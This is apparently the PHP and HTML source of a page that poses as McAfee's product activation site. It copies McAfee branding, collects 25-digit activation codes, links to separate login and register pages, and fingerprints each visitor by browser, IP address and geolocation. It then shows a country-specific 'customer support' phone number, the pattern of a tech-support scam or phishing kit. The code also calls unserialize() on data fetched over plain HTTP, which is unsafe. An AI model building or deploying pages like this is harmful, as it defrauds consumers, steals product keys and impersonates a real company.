<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();

?>
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?>
    <?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html>
<head>
	<title>Mcafee Activate</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="shortcut icon" href="img/favicon.ico"/>

	<link rel="stylesheet" href="css/style.css">
	<style>
/* .image-key-hint{
 display:none;
} */
</style>
<script>
// $(document).ready(function(){
//  $('.where-is-code').click(function(){
//    $('.image-key-hint').toggle('1000');
//  });
// });
</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154545431-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-154545431-1');
</script>

</head>
<body>

    <div class="container-fluid">
        <div class="col-lg-2 col-md-2 col-sm-2"></div>
        <div class="col-lg-8 col-md-8 col-sm-8 col-xs-12 form-box">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-xs-3">
                    <a href="index.php"><img src="img/logo.png" alt=""></a> 
                </div>
                <div class="col-lg-9 col-md-9 col-xs-9" style="margin-top: -11px;">
                    
                </div>
            </div>    
            <div class="col-lg-12 login-header-link">
                <div class="col-lg-8 col-xs-8">
                    <ul class="mcafee-login-header">
                        <li><a href="act-mca.php">Activate Activation Code </a> </li>
                        <li><a href="mcalog/index.php">Login </a></li>
                        <li><a href="mcareg/index.php">Register </a></li>
                        <li><a href="mca-support.php">Contact Support </a></li>
                    </ul>
                </div>
                <div class="col-lg-4 text-right login-header-side">
                </div>
            </div>
        <br><br><br>
            <h2 class="mcafee-heading">Get started with McAfee Security</h2>
            <hr class="pipe"> 
            <a href="" class="number-1">1</a>
            <a href="" class="number-2">2</a>
            <a href="" class="number-3">3</a>
            <a href="" class="enter-code">ENTER YOUR CODE</a>
            <a href="" class="create-acc">CREATE ACCOUNT</a>
            <a href="" class="protected">GET PROTECTED</a>
            <form action="product.php" class="form-des" method="post">
                <h3>Enter your 25-digit activation code</h3>
                <input type="text"  name="key" class="input-key" placeholder="xxxxx-xxxxx-xxxxx-xxxxx-xxxxx" required>
                <br>
                <a  class="where-is-code" >You will find activation code on the card</a> <br>
                <input type="submit" name="submit" class="btn-submit-code" value="Submit">
            </form>
            <div class="image-key-hint none-img">
                <img src="img/key.png" alt="" >
            </div>
            <div>
                <img src="img/31.png" alt="" class="copy-foot-img">
                <p class="footer-copy">© 2003-2019 McAfee, LLC</p>
            </div>
        </div>
        <div class="col-lg-8 col-md-8 col-sm-2"></div>
    </div>
    <div class="footer">
  <p><span class="cont-text">contact customer support :</span> <span class="number-hp">
  
<?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4982";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0332";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0332";
}
else
{
    echo "+1 844 514 0332";
}
?>  
  </span> </p>
</div>

</body>
</html>
